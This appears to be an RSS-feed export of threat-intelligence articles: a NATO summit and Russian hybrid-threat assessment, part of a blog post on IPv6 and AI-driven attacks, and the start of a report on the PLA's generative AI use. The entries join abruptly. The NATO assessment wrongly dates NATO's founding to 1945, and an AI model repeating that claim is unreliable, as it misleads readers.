fr Deutschland (AfD) has questioned NATOs continued utility and has advocated for closer Germany-Russia ties. </p><p>Differences in NATO states probable responses to Russias multi-pronged attempts to weaken NATO and its allies will almost certainly strain NATOs ability to project a unified response to Russias actions. Though NATO has, from its founding in 1945, been primarily concerned with resisting Russian aggression, in the last two years, Russia has significantly escalated its aggression towards NATO and its allies, with Moscows full-scale invasion of Ukraine, escalating sabotage operations in NATO territory, and widespread influence operations aimed at undermining public confidence in Western democracy and manipulating elections in favor of pro-Russia candidates.</p><h4 id="profiles-of-key-players">Profiles of Key Players</h4><h5 id="united-states--unpredictable-nato-leader">United States  Unpredictable NATO Leader</h5><p>Inconsistent statements by senior US officials about NATOs utility and how much to resist Russian aggression likely make it difficult to predict the USs 2025 NATO Summit priorities, which will have significant influence over the tone of the summit and the text of the Summit Declaration. That said, the US almost certainly will <a href="https://www.heritage.org/global-politics/report/what-success-story-looks-top-us-priorities-the-june-2025-nato-summit-the" target="_blank">call</a> for NATO member states to spend 3.5 to 5% of their GDP on defense, judging from <a href="https://www.straitstimes.com/world/united-states/trump-says-nato-members-should-raise-defence-spending-to-5-of-gdp?utm_source=chatgpt.com" target="_blank">past</a> statements by President Trump. The US is also likely to push for NATOs increased focus on China-nexus threats to NATO territory, judging from the Trump administrations emphasis on resisting Chinese global aggression. The USs inconsistent policies toward Russia  ranging from <a href="https://www.bbc.com/news/articles/cg5q0mev07lo" target="_blank">supporting</a> Russias view that Kyiv started the Russia-Ukraine war to <a href="https://www.cnn.com/2025/05/27/politics/russia-sanctions-trump-ukraine-war" target="_blank">calling</a> for additional sanctions on Russia  make it difficult to predict the USs stance on Russia at the summit. <a href="https://www.euractiv.com/section/defence/news/nato-plans-to-sideline-zelenskyy-at-june-summit-to-keep-trump-happy/" target="_blank">Reporting</a> suggests senior NATO officials  including the NATO Secretary General  are considering deemphasizing Ukraine at the summit, potentially including not inviting Ukrainian President Volodymyr Zelensky, to avoid alienating President Trump. We assess this suggests that at least some NATO states might be willing to compromise on their priorities to ensure the US remains invested in the alliance.</p><h5 id="poland--concerns-about-existential-threats-from-moscow-drive-militarization">Poland  Concerns about Existential Threats from Moscow Drive Militarization</h5><p>Polands presidential election likely raises questions about Warsaws level of support for Ukraine at the 2025 NATO Summit and beyond. Law and Justice (PiS) candidate Karol Nawrocki won the runoff on June 2, 2025. Nawrocki has stated that he would veto Ukraines accession to NATO, suggesting Warsaw is likely to be less inclined to support additional NATO aid to Ukraine. However, Nawrocki is likely to remain committed to building up Polands military capabilities to resist Russian aggression. Warsaws history of being invaded by Russia and Putins <a href="https://www.legal-tools.org/doc/tt382m/pdf" target="_blank">rhetoric</a> undermining Polands sovereignty almost certainly have led Poland to conclude that NATO strength is one of the only deterrents to Russian aggression within Poland, potentially including territorial incursions. Polish leaders have <a href="https://www.politico.eu/article/donald-tusk-plan-train-poland-men-military-service-russia/" target="_blank">announced</a> plans to increase the size of Polands standing army from 200,000 to 500,000 and provide military training to every Polish man. </p><h5 id="united-kingdom--member-of-pro-nato-unity-bloc">United Kingdom  Member of Pro-NATO Unity Bloc</h5><p>The United Kingdom (UK) is likely to strongly <a href="https://www.gov.uk/government/speeches/prime-ministers-oral-statement-to-the-house-of-commons-25-february-2025?utm_source=chatgpt.com" target="_blank">advocate</a> for continued NATO unity to resist threats, including an increase in NATO assistance to Ukraine. The UK has announced a commitment to increase its defense spending to 2.5% of its GDP by 2030. Notably, UK Prime Minister Keir Starmer has <a href="https://www.bbc.com/news/articles/clyelpzqn28o" target="_blank">backed</a> NATO membership for Ukraine despite US objections, suggesting there could be tension between the US and UK on this issue at the summit.</p><h5 id="germany--member-of-pro-nato-unity-bloc">Germany  Member of Pro-NATO Unity Bloc</h5><p>Germany is likely to be more committed to NATO unity and increased defense spending than it has in previous NATO summits, as it adopts a position similar to that of the UK and France. Senior German officials have <a href="https://www.reuters.com/world/berlin-backs-trumps-demand-hike-nato-spending-target-5-2025-05-15/?utm_source=chatgpt.com" target="_blank">pledged</a> to spend 5% of Germanys GDP on defense. Merzs government <a href="https://responsiblestatecraft.org/german-defense-spending-increase/" target="_blank">voted</a> to revise Germanys constitution to allow increased defense spending and facilitate the largest German rearmament since World War II. Chancellor Merz has also expressed support for Ukraine joining NATO, though he has rejected the idea of sending NATO troops to Ukraine. </p><h5 id="france--member-of-pro-nato-unity-bloc">France  Member of Pro-NATO Unity Bloc</h5><p>Frances position at the 2025 NATO Summit is likely to be broadly similar to that of the UK and Germany. French President Emmanuel Macron has <a href="https://www.politico.eu/article/macron-urges-europe-to-boost-defense-spending-to-over-3-percent-of-gdp/" target="_blank">advocated</a> for NATO states to increase their defense spending to 3 to 3.5% of their GDPs. France has <a href="https://www.france24.com/en/europe/20250311-european-nato-paris-ukraine?utm_source=chatgpt.com" target="_blank">called</a> for credible security guarantees for Ukraine via a coordinated NATO <a href="https://www.lemonde.fr/en/europe/article/2025/03/11/macron-hosts-military-chiefs-from-30-countries-to-discuss-ukraine_6739036_143.html?utm_source=chatgpt.com" target="_blank">strategy</a>, including a pathway for Ukraine to join NATO. Macron is also likely to <a href="https://www.military.com/daily-news/2025/03/04/macron-discuss-nuclear-deterrence-european-allies-look-frances-unique-strategy.html?utm_source=chatgpt.com" target="_blank">advocate</a> for the expansion of nuclear deterrence measures to strengthen NATOs defenses.</p><h5 id="hungary--efforts-to-balance-nato-membership-with-close-russia-relations-complicate-nato-unity">Hungary  Efforts to Balance NATO Membership with Close Russia Relations Complicate NATO Unity</h5><p>Hungary is likely to take a multifaceted approach that aims to balance participation in core NATO functions, including defense spending targets and collective defense mechanisms, with avoiding providing direct military assistance to Ukraine, likely to preserve Hungarys relationship with Russia. Hungary has <a href="https://www.belfercenter.org/publication/us-engagement-hungary-reshaping-natos-collective-alliance?utm_source=chatgpt.com" target="_blank">met</a> NATOs longtime 2% defense spending target, though its efforts to maintain a positive relationship with Russia are likely to complicate NATOs ability to project a unified response to Russian aggression. Hungarys plans to <a href="https://www.gbnews.com/news/world/viktor-orban-hungary-nato-membership?utm_source=chatgpt.com" target="_blank">determine</a> a way to avoid operations outside of NATO territory suggest it could complicate NATO responses to conflicts, even outside of the Russia-Ukraine war.</p><h5 id="trkiye--pivotal-independent-player-most-well-positioned-to-influence-nato-priorities">Trkiye  Pivotal Independent Player, Most Well-Positioned to Influence NATO Priorities</h5><p>Trkiyes strong military and unique diplomatic positioning to broker talks with Western powers as well as Russia and China means it likely feels empowered to push NATO to adopt Turkish priorities. For example, Trkiye initially <a href="https://foreignpolicy.com/2024/01/28/turkey-sweden-nato-erdogan-foreign-policy-history-us-europe-west/" target="_blank">opposed</a> Swedish admission into NATO due to Sweden providing asylum for members of the Kurdistan Workers Party, a political party Ankara considers a terrorist organization. Trkiye eventually <a href="https://www.npr.org/2024/01/27/1227418505/f-16s-turkey-sweden-nato-kurds-greece" target="_blank">agreed</a> to Swedish admission into NATO after securing key concessions from the US, including F-16 fighter jets. </p><p>Trkiye <a href="https://breakingdefense.com/2024/10/turkish-defense-spending-to-reach-record-high-amid-neighboring-conflicts/" target="_blank">announced</a> plans in October 2024 to increase its defense and security spending in 2025 to $47 billion, its highest-ever military budget. Ankara has <a href="https://www.straitstimes.com/world/europe/turkey-ready-to-host-russia-ukraine-peace-talks-erdogan-tells-putin?utm_source=chatgpt.com" target="_blank">offered</a> up its services as a mediator in the Russia-Ukraine war, though Ankaras often close relations with Moscow make it unclear to what extent Trkiye would be able to be a neutral arbiter between Moscow and Kyiv. More broadly, Trkiye is likely to seek NATO support for its own national priorities, including counterterrorism, as well as a lifting of NATO arms embargoes on Trkiye, which Ankara <a href="https://nordicmonitor.com/2024/07/erdogan-seeks-lifting-of-unofficial-embargoes-on-turkey-at-nato-summit/?utm_source=chatgpt.com" target="_blank">argues</a> undermines Turkish defense capabilities. </p><h3 id="hybrid-threats-to-nato-member-states">Hybrid Threats to NATO Member States</h3><p>Russian hybrid threats  including sabotage of critical infrastructure, vandalism, weaponized migration, and coercive military posture  will very likely continue to target European countries ahead of and following the 2025 NATO Summit. While these operations are unlikely to directly target the summit event itself, threats to the critical infrastructure of NATO member countries are likely heightened as Moscow seeks to destabilize member states and exploit divisions within the alliance. Hybrid threats will almost certainly increase their targeting of NATO member countries following the summit if it results in significant action regarding Ukraine, such as a joint commitment to further military aid to Kyiv. In January 2025, the Finnish Defence Forces <a href="https://puolustusvoimat.fi/documents/1948673/2014902/PV_sotilastiedustelu_raportti_EN_2025_web.pdf/c0125ed9-1467-23e7-e7b6-a7891c4fb5fe/PV_sotilastiedustelu_raportti_EN_2025_web.pdf" target="_blank">assessed</a> that Russia will likely increase the use of all hybrid methods as it seeks to cause disunity within NATO and the European Union, including cyber and information influencing, coercive use of energy exports, targeting of energy and other critical infrastructure, weaponizing immigration, and intelligence operations. </p><h4 id="russian-hybrid-warfare-units">Russian Hybrid Warfare Units</h4><p>Insikt Group identified at least five Russian units dedicated to hybrid warfare operations, including sabotage, assassinations, arson attacks, espionage, and recruitment of foreign agents (<strong>Table 1</strong>). The Kremlin also very likely <a href="https://www.mi5.gov.uk/director-general-ken-mccallum-gives-latest-threat-update" target="_blank">employs</a> individuals not directly affiliated with its security or intelligence services to <a href="https://tvn24.pl/plus/programy/czarno-na-bialym/szpiedzy-w-polsce-czy-wobec-takiego-zagrozenia-jestesmy-bezradni-reportaz-piotra-swierczka-vc8358848" target="_blank">conduct</a> hybrid threat activity, in an effort to prevent discovery and complicate attribution. For example, GRU Military Unit 54654 very likely recruits operatives without prior military contracts or connections to the Russian government to avoid identification, including recruiting foreign students studying in Russia, Russian students abroad, and criminal organizations in Russia and abroad. </p><p>Recent arrests and incidents of potential sabotage across Europe <a href="https://www.politico.eu/article/europe-russia-hybrid-war-vladimir-putin-germany-cyberattacks-election-interference/" target="_blank">indicate</a> that recruits are largely young men, Russian-<a href="https://www.theguardian.com/technology/2025/mar/18/russia-criminal-networks-drive-increase-sabotage-europol" target="_blank">speaking</a> but not Russian citizens, <a href="https://www.cia.gov/static/DCIA_Bill_Burns_MI6_Chief_Richard_Moore_with_FT_Editor_Roula_Khalaf_Transcript.pdf" target="_blank">often</a> with a criminal background and <a href="https://www.occrp.org/en/investigation/make-a-molotov-cocktail-how-europeans-are-recruited-through-telegram-to-commit-sabotage-arson-and-murder" target="_blank">recruited</a> via Telegram. For example, Polish Foreign Minister Radek Sikorski <a href="https://www.bbc.com/news/videos/ceqgxv7ejxwo" target="_blank">stated</a> in an interview that Russia used Telegram to recruit the perpetrators of the May 2024 arson attacks on a Warsaw shopping mall. In March 2025, the Finnish Defence Forces <a href="https://puolustusvoimat.fi/documents/1948673/2014902/PV_sotilastiedustelu_raportti_EN_2025_web.pdf/c0125ed9-1467-23e7-e7b6-a7891c4fb5fe/PV_sotilastiedustelu_raportti_EN_2025_web.pdf" target="_blank">assessed</a> that attempts to recruit human sources online, and particularly on pro-Russian social media platforms, are likely to become more common. Similarly, Moscow can also likely co-opt vessels affiliated with its shadow fleet to conduct low-sophistication destructive actions targeting submarine infrastructure, such as anchor dragging, as these assets likely draw less scrutiny. </p><table>  <tr>    <td><strong>Entity</strong></td>    <td><strong>Hierarchy</strong></td>    <td><strong>Operations</strong></td>  </tr>  <tr>    <td>Department of Special Tasks (  )</td>    <td>Established in 2023 by GRU Deputy Director Andrey Vladimirovich Averyanov and Ivan Sergeevich Kasianenko<p>Encompasses GRU units 29155 and 54654</td>    <td>Reportedly <a href="https://www.wsj.com/world/europe/russia-spy-covert-attacks-8199e376" target="_blank">responsible</a> for a planned assassination plot targeting Rheinmetall CEO Armin Papperger and explosives planted at DHL logistics centers in 2024</td>  </tr>  <tr>    <td>GRU Unit 29155 (/ 29155)</td>    <td>Now under the Department of Special Tasks; led by Averyanov</td>    <td>Reportedly involved in bounties on US soldiers in Afghanistan, the 2018 Skripal <a href="https://www.bellingcat.com/news/uk-and-europe/2020/10/23/russias-clandestine-chemical-weapons-programme-and-the-grus-unit-21955/" target="_blank">poisoning</a> and sabotage <a href="https://www.france24.com/en/europe/20210420-unit-29155-the-russian-spies-specialising-in-sabotage-and-assassinations" target="_blank">operations</a>; linked to cyber espionage and Russian influence network CopyCop</td>  </tr>  <tr>    <td>GRU Unit 54654 (/ 54654)</td>    <td>Now <a href="https://www.csis.org/analysis/russias-shadow-war-against-west" target="_blank">under</a> Department of Special Tasks</td>    <td>Recruits operatives without prior military or government connections; behind illegals intelligence programs</td>  </tr>  <tr>    <td>GRU Unit 54777 (/ 54777)</td>    <td>Also <a href="https://www.congress.gov/crs-product/IF11718" target="_blank">known</a> as the 72nd Special Service Center</td>    <td><a href="https://www.congress.gov/crs-product/IF11718" target="_blank">Conducts</a> psychological operations; exploited Ukraine peace demonstrations in Germany to influence public opinion</td>  </tr>  <tr>    <td>Main Directorate of Deep Sea Research (   , GUGI)</td>    <td>Reports directly to the Ministry of Defense; naval base in Olenya Bay </td>    <td>Very likely involved in submarine infrastructure surveillance and sabotage; maintains at least eight nuclear submarines and thirteen ships, including the Yantar, which hosts two deep-sea submarines</td>  </tr></p></table><p><em><strong>Table 1:</strong> Formal Russian government entities affiliated with sabotage or hybrid threat operations (Source: Recorded Future)</em></p><h5 id="sabotage">Sabotage</h5><p>Russia very likely aims to target European critical infrastructure with hybrid cyber-kinetic operations, regardless of the outcome of current peace negotiations on Ukraine. Based on recent incidents, countries neighboring Russia  Estonia, Finland, Latvia, Lithuania, and Poland  likely <a href="https://jamestown.org/program/poland-on-the-frontlines-against-russias-shadow-war/?utm_source=All+Subscribers&utm_campaign=cf94211450-EMAIL_CAMPAIGN_2025_02_14_07_49_COPY_01&utm_medium=email&utm_term=0_-a46e3b4ee2-155273798&mc_cid=cf94211450&mc_eid=1d39ed9d2e" target="_blank">represent</a> the most attractive targets for sabotage operations. Additionally, countries providing the strongest support to Ukraine, such as Germany and Poland, are almost certainly at greater risk of physical threats than countries that do not provide significant aid, such as Hungary, which Moscow is unlikely to directly target. Specifically, Insikt Group assessed in April 2025 that Russias threat perception and intent to target European energy entities would likely increase following the European Union (EU)s <a href="https://commission.europa.eu/news/roadmap-fully-end-eu-dependency-russian-energy-2025-05-06_en" target="_blank">announcement</a> of a framework to eliminate Russian fossil fuel imports by 2027.</p><p>Russia-directed sabotage attacks targeting the critical infrastructure and key government and military facilities of European countries have almost certainly <a href="https://www.recordedfuture.com/research/russian-sabotage-activities-escalate-amid-fraught-tensions" target="_blank">increased</a> since 2022. Recent incidents suggest that these operations largely involve low-sophistication tactics with a degree of plausible deniability and obfuscated links to Moscow, often initially appearing as accidents or single criminal events, complicating attribution and identification of a larger strategic trend. For example, in March 2025, Polish prosecutors <a href="https://www.politico.eu/article/russia-spy-belarusian-refugee-warsaw-mall-fire-prosecutor/" target="_blank">announced</a> that an alleged Belarusian refugee masquerading as an opposition activist had set fire to a Warsaw supermarket on Russias behalf in April 2024, and Lithuanian prosecutors <a href="https://www.bbc.com/news/articles/c757kpk21d9o" target="_blank">attributed</a> an arson attack on an Ikea store in Vilnius in May 2024 to two teenagers recruited by Russias Main Directorate of the General Staff of the Armed Forces (GRU). In December 2024, the Federal Prosecutors Office in Germany announced charges against three Russian-German nationals for reportedly surveying a US military base in Grafenwhr, a weapons factory in Bayreuth, and military facilities and railway lines to support sabotage operations using explosives. According to the Center for Strategic and International Studies (CSIS), Russia-directed sabotage attacks in Europe <a href="https://www.csis.org/analysis/russias-shadow-war-against-west" target="_blank">tripled</a> between 2023 and 2024 (from 12 to 34 attacks), after quadrupling between 2022 and 2023 (from 3 to 12 attacks).</p><h5 id="threats-to-submarine-cable-infrastructure">Threats to Submarine Cable Infrastructure</h5><p>Sabotage operations targeting submarine cables off the coast of Europe almost certainly represent a relatively low-effort, high-reward vector for targeting European critical infrastructure. In June 2023, Insikt Group <a href="https://www.recordedfuture.com/research/escalating-global-risk-environment-submarine-cables" target="_blank">assessed</a> that Russias ongoing war against Ukraine was very likely fueling physical attacks and intelligence collection efforts against the submarine cable system to undermine the economic, diplomatic, and national security objectives of the US and its NATO allies. Specifically, Russia almost certainly presents the greatest direct threat to submarine cables in the North and Baltic Seas. </p><p>Insikt Group identified four incidents involving damage to eight submarine cables in the Baltic Sea in 2024 and 2025: January 2025 <a href="https://www.svt.se/nyheter/utrikes/uppgifter-om-nytt-kabelbrott-i-ostersjon" target="_blank">damages</a> to the C-Lion1 cable connecting Germany and Finland; January 2025 <a href="https://www.svt.se/nyheter/utrikes/lettland-utreder-sabotage-efter-kabelbrott-utanfor-gotland" target="_blank">damages</a> to the Sweden-Latvia cable; December 2024 <a href="https://www.theguardian.com/world/2024/dec/26/finnish-coastguard-boards-eagle-s-oil-tanker-suspected-of-causing-power-cable-outages" target="_blank">damages</a> to four submarine internet cables (likely the Finland Estonia Connection 1, Finland Estonia Connection 2, Baltic Sea Submarine Cable, and C-Lion1) and the Estlink-2 power cable; and November 2024 damages to the C-Lion1 and BCS East-West Interlink. Prosecutors have attributed these damages to vessels, some with connections to Russia, dragging their anchors; for example, the Eagle S vessel behind the December 2024 cable cuts is <a href="https://www.lloydslist.com/LL1151955/Russia-linked-cable-cutting-tanker-seized-by-Finland-was-loaded-with-spying-equipment" target="_blank">suspected</a> to be part of Russias shadow fleet and reportedly carried surveillance equipment. While none of these incidents caused prolonged outages or communication disruptions due to the availability of alternate routes for data transmission, increased societal concerns about the vulnerability of critical infrastructure had a <a href="https://www.rand.org/pubs/commentary/2025/01/countering-russias-shadow-fleet.html" target="_blank">clear</a> <a href="https://katsaus.supo.fi/en/russian-sabotage-in-europe" target="_blank">psychological</a> <a href="https://news.postimees.ee/8255914/vox-populi-of-political-parties-lauri-laanemets-if-russian-ships-reach-estonian-waters-it-is-too-late?cx_testId=25&cx_testVariant=cx_1&cx_artPos=0#cxrecs_s" target="_blank">impact</a> on northern European populations. A more coordinated attack on submarine critical infrastructure could cause disruptions to business operations, financial losses, and communications disruptions, raising the risk of economic ramifications to northern and eastern Europe. In 2024, Estonian power provider Elering <a href="https://www.politico.eu/article/russia-sabotage-undersea-cables-baltic-sea-europe-war/" target="_blank">reported</a> that energy bills spiked by 10% due to a technical problem with a power cable, with board member Erkki Sapp stating that energy infrastructure can handle any single event, but if there are several of these sorts of events, then this may lead to issues with security of supply. </p><p>In addition to threats to critical infrastructure, Moscow has very likely attempted to <a href="https://mwi.westpoint.edu/weaponized-migration-in-eastern-europes-frozen-north-do-not-overlook-russian-hybrid-warfare/" target="_blank">weaponize</a> refugee flows in an effort to foment domestic unrest and exploit concerns about immigration in countries bordering Russia and Belarus. In October 2024, Poland temporarily <a href="https://www.politico.eu/article/poland-prime-minister-donald-tusk-eu-asylum-ban-russia-belarus-migration-security/" target="_blank">suspended</a> asylum rights for migrants entering the country via Belarus, over concerns that Russia had orchestrated an influx of migrants at that border as part of hybrid tactics to destabilize Poland. Similarly, Finland <a href="https://apnews.com/article/finland-russia-border-migration-313b2a1846f4aa4b349fa577ce8c39a4" target="_blank">closed</a> its last border crossing with Russia in November 2023 after accusing Moscow of facilitating the crossing of approximately 1,000 migrants without valid documentation. Throughout 2021 and 2022, Lithuania <a href="https://warsawinstitute.org/tightening-immigration-and-border-policy-initiatives-in-the-baltics/" target="_blank">documented</a> similar efforts by the Belarusian government to push migrants across the border. As such, the weaponization of migration across Russian and Belarusian borders with NATO member states, particularly Finland, Poland, Estonia, Latvia, and Lithuania, likely remains a viable tactic to attempt to destabilize these countries.</p><h5 id="coercive-military-posture">Coercive Military Posture</h5><p>Russias plans to expand its military capabilities near the border with Finland and the Baltic states will very likely focus on increasing military presence and intelligence capabilities. Moscows ability to implement these changes has been constrained by its ongoing military operations in Ukraine, although it has already taken several key steps in 2024  most notably, the creation of the Leningrad Military District bordering Finland and the Baltics, which Moscow frames as its response to NATO expansion. Russia reportedly <a href="https://www.thebarentsobserver.com/news/kola-and-in-karelia-likely-to-get-tens-of-thousands-of-new-soldiers/423579#:~:text=A%20completely%20new%20army%20corps,the%2080th%20Motorised%20Infantry%20Brigade" target="_blank">aims</a> to increase the size of its armed forces by 350,000 by 2026, of which up to 50,000 will deploy to the Leningrad Military District, potentially <a href="https://www.helsinkitimes.fi/finland/finland-news/domestic/25983-russia-s-military-buildup-near-finland-stalls-amid-ukraine-war.html" target="_blank">increasing</a> troop numbers near Finland from approximately 30,000 to 80,000. While Finnish and Latvian intelligence services <a href="https://www.helsinkitimes.fi/finland/finland-news/domestic/25983-russia-s-military-buildup-near-finland-stalls-amid-ukraine-war.html" target="_blank">have</a> <a href="https://eng.lsm.lv/article/society/defense/06.05.2025-latvias-intelligence-service-russia-is-undergoing-military-reform.a597782/" target="_blank">assessed</a> that planned troop increases will not be completed for several years, Russia will very likely seek to ramp up implementation of military reforms should the conflict in Ukraine decrease in intensity, focusing on increasing military presence and capabilities in its northwestern regions. </p><p>In addition to expanding its military capabilities along NATO member state borders, Russian coercive military actions via incursions into NATO airspace will also likely increase ahead of the 2025 NATO Summit. In April 2024, the foreign ministers of Estonia, Latvia, Lithuania, Finland, and Sweden met to discuss growing global positioning system (GPS) interference in the region, which Estonian Foreign Minister Margus Tsahkna attributed to Russia and which Insikt Group assessed would continue through then-ongoing STEADFAST DEFENDER 2024 military exercises. In its annual report in May 2025, Latvias Military Intelligence and Security Service (MIDD) <a href="https://eng.lsm.lv/article/society/defense/06.05.2025-latvias-intelligence-service-russia-is-undergoing-military-reform.a597782/" target="_blank">reported</a> that Russia has increasingly been monitoring NATO activity in the Baltic Sea and engaging in acts such as unauthorized airspace violations, in a likely attempt to intimidate, test NATO responses, and discredit regional defense capabilities. </p><p>To read the entire analysis, <a href="https://go.recordedfuture.com/hubfs/reports/cta-2025-0618.pdf" target="_blank">click here</a> to download the report as a PDF.</p>]]></content:encoded>

            <content:encoded><![CDATA[<h2 id="ai-hackathons-and-the-future-of-security-architecture">AI Hackathons and the Future of Security Architecture</h2><p>Last week, a few <a href="https://www.recordedfuture.com/work-with-us">Futurists</a> met up to work out the practical realities of AI-enabled Red Teaming (among other topics). In addition to two days of phenomenal vibe coding in <a href="https://www.cursor.com/">Cursor</a>, the final presentations were light on hyperbole and heavy on capabilities and remarkable outcomes, created in a day or less. Two years ago, when LLMs made their mainstream debut, I was dubious, but the hackathon confirmed recent observations (last three months) that AI is accelerating security workflows (like everything else) at warp speed. Change, soon driven primarily through various agentic flavors, is happening at a pace that is difficult to comprehend.</p><p>The flight home was spent considering how to get ahead of the adversarial/defensive agent wars that will soon play out across the internet. Given the vast amount of uncertainty in agentic implementations and scale, there are no perfect solutions, but there are architecture scenarios worth considering NOW. Principal among them is <a href="https://networklessons.com/ipv6/introduction-to-ipv6">IPv6</a>. Long a headache for architects and engineers (nibble boundaries anyone?), IPv6 may now represent real business value through security, in exchange for the considerable effort. AI is a natural forcing function here. Given the time required to implement IPv6 and resolve the inevitable challenges along the way, enterprises should begin the work, aided by AI, of course.</p><h2 id="why-ipv6-belongs-in-your-five-year-security-roadmap">Why IPv6 Belongs in Your Five-Year Security Roadmap</h2><p>What if eliminating opportunistic attacks required nothing more than updating your network architecture? The vast IPv6 address space transforms internet-wide scanning from trivial to computationally impossible, removing one critical leg from the attacker&#39;s operational stool.</p><p>Modern adversaries operate on economics: maximum victims, minimum effort. <strong>IPv6&#39;s <a href="https://www.techtarget.com/whatis/feature/IPv6-addresses-how-many-is-that-in-numbers">340 undecillion addresses</a></strong> create an insurmountable barrier for brute-force discovery and enumeration, forcing attackers to abandon cheap, scalable tactics.

            <description><![CDATA[Explore how Chinaâs PLA is adopting generative AI for military intelligence. This Insikt Group report reveals AI-driven intelligence tools, strategic adaptations, and implications for global security.]]></description>
            <content:encoded><![CDATA[<p><img src="https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png" alt="insikt group logo"></p><h2 id="executive-summary">Executive Summary</h2><p>The Peoples Liberation Army (PLA) has demonstrated clear interest in using generative artificial intelligence (AI) to support intelligence work, has designed methods and systems that apply generative AI to intelligence tasks, and has likely procured generative AI for intelligence purposes. Both the PLA and Chinas defense industry have very likely adapted foreign and domestic large language models (LLMs) to develop specialized models that can effectively carry out intelligence tasks. The PLA and Chinas defense industry have created generative AI-based intelligence tools that can reportedly process and analyze intelligence data, generate intelligence products, answer questions, provide recommendations, facilitate early warning, and support decision-making, among other functions. These tools are broadly intended to improve the speed, efficiency, accuracy, and scale of intelligence tasks while reducing costs. Though elements of the PLA have expressed optimism about the benefits of generative AI and are likely taking initial steps to apply this technology to intelligence work, the PLA has very likely recognized the limitations and risks of this technology. Consequently, the extent to which the PLA will integrate generative AI into intelligence activities  and the ultimate effectiveness of this integration  remains unclear.</p><p>The PLAs interest in using generative AI to support military intelligence presents challenges for both the PLA and the West. For the PLA, given the limitations and risks of generative AI, successful adoption of this technology will require experimenting with the intelligence applications of generative AI, accurately assessing the outcomes of these experiments, and appropriately applying generative AI to intelligence work based on these outcomes and assessments; failure to do so could result in inaccurate intelligence that degrades the quality of decision-making. Moreover, if PLA intelligence analysts use generative AI models that were developed to conform with Chinese Communist Party (CCP) ideology or trained on ideologically biased analytical products, the PLA risks reducing the objectivity of intelligence analysis. For the West, the PLAs application of generative AI to intelligence work creates technology transfer challenges and highlights the risk of Chinese counterintelligence organizations using generative AI to generate inauthentic but convincing information to mislead Western intelligence analysts and degrade the intelligence value of open-source information.</p><h2 id="key-findings">Key Findings</h2><ul><li>PLA media and researchers affiliated with the PLA have argued that the application of generative AI to military intelligence has a wide range of potential benefits, including improving the collection and analysis of intelligence and providing enhanced decision-making capabilities to military commanders, but have also recognized various challenges and risks associated with using this technology for intelligence work. </li><li>Likely realizing the intelligence limitations of general-purpose generative AI models, the PLA and Chinas defense industry are likely prioritizing the development and use of specialized models that have been fine-tuned for intelligence tasks.</li><li>The PLA and Chinas defense industry have very likely used a mix of proprietary and open-source LLMs from foreign and domestic developers to create generative AI-based intelligence tools. Foreign LLMs used this way very likely include models from Meta, OpenAI, and BigScience, among others, while domestic LLMs very likely include models from DeepSeek, Tsinghua University, Zhipu AI, and Alibaba Cloud, among others.</li><li>PLA patent applications reveal that the PLA has designed methods and systems that use generative AI to facilitate intelligence tasks such as generating open-source intelligence (OSINT) products, processing satellite imagery, supporting event extraction, and processing event data.</li><li>In a patent application filed in December 2024, a Chinese state-owned defense industry research institute proposed using OSINT, human intelligence (HUMINT), signals intelligence (SIGINT), geospatial intelligence (GEOINT), and technical intelligence (TECHINT) data to train a military LLM to specialize in intelligence tasks, purportedly enabling the enhanced military LLM to support every phase of the intelligence cycle and improve decision-making during military operations.</li><li>The PLA and Chinas defense industry have likely procured generative AI technology to support OSINT and science and technology (S&amp;T) intelligence, an indicator that at least some elements of Chinas military are likely beginning to apply generative AI to intelligence tasks.</li><li>The PLA  which very likely rapidly adopted DeepSeeks generative AI models in early 2025  is likely using DeepSeeks LLMs for intelligence purposes, based on claims by a Chinese defense contractor that it has provided a DeepSeek-based OSINT model to the PLA.</li><li>The PLA is likely concerned that foreign counterintelligence organizations could use generative AI to produce convincing inauthentic content to mislead Chinese intelligence personnel and degrade the intelligence value of open-source information. Chinese counterintelligence organizations could apply generative AI in a similar manner.</li></ul><h2 id="methodology">Methodology</h2><p>To assess the PLAs views on and application of generative AI in intelligence work, Insikt Group collected and analyzed articles published in PLA media, academic research authored by PLA personnel, PLA and Chinese defense industry patent applications, PLA and Chinese defense industry procurement records, information published by Chinese defense contractors, and data available in the Recorded Future Platform, among other sources. The sources cited in the report do not necessarily represent official PLA policies related to generative AI; rather, they demonstrate how individuals and organizations situated within the PLA and Chinas defense industry are likely exploring and developing the intelligence applications of generative AI. This report does not assess the veracity of technical claims from the PLA and Chinas defense industry, but entities that develop or sell intelligence-related generative AI tools likely have an incentive to exaggerate the effectiveness of generative AI and downplay its deficiencies, so information provided by these entities should be viewed with skepticism.</p><p>Generative AI is a broad term, and some of its subcategories lack clear boundaries, which occasionally created challenges for this investigation. In some instances, we observed references to generative AI models like LLMs being used for possible non-generative functions; we assessed these references were still relevant to our investigation. Moreover, Chinese sources frequently use the term large model () when discussing AI models rather than more specific terms like LLM. Not all large models are considered to be generative AI, so we did not automatically assume that every reference to a large model was related to generative AI. We only classified a reference to a large model as generative AI when other information confirmed the models generative nature. <strong>Appendix A</strong> provides a glossary of generative AI terminology for readers unfamiliar with this technology.</p><h2 id="views-on-generative-ai-in-military-intelligence">Views on Generative AI in Military Intelligence</h2><h3 id="pla-daily">PLA Daily</h3><p>The PLAs official paper, PLA Daily, has published a handful of articles that directly discuss the intelligence implications of generative AI, which are summarized in <strong>Table 1</strong>. These articles discuss the potential benefits of generative AI for military intelligence, highlighting the supposed ability of this technology to generate intelligence products, predict changes on the battlefield, facilitate intelligence activities during both peacetime and wartime, improve the efficiency of intelligence analysis, and provide decision-making support to commanders. These articles also note potential challenges associated with generative AI, suggesting that generative AI models cannot replace up-to-date intelligence and warning that the intelligence agencies of competing countries could exploit deepfakes to interfere with rival agencies.</p><table>  <tr>    <td><strong>Date</strong></td>    <td><strong>Summary</strong></td>  </tr>  <tr>    <td>August 2024</td>    <td>PLA Daily published an article on large generative AI models in operational command and control, which contends that large models can generate intelligence briefs, extract intelligence main points, and predict changes in the battlefield situation. However, the article also suggests that large models cannot replace up-to-date intelligence information, arguing that these models can function as encyclopedias but can only query information from their training data. As such, large models reportedly depend on up-to-date intelligence information to analyze and judge the battlefield situation, organize and integrate intelligence products, and connect and mine intelligence knowledge.</td>  </tr>  <tr>    <td>April 2023</td>    <td>PLA Daily published an article on the military applications of ChatGPT, which describes ChatGPT as having intelligence applications in both peacetime and wartime. In peacetime, ChatGPT can reportedly serve as a virtual assistant to help analysts analyze the massive amount of information available on the internet, improving the efficiency of analysis and mining hidden high-value intelligence. In wartime, ChatGPT can reportedly integrate large amounts of battlefield 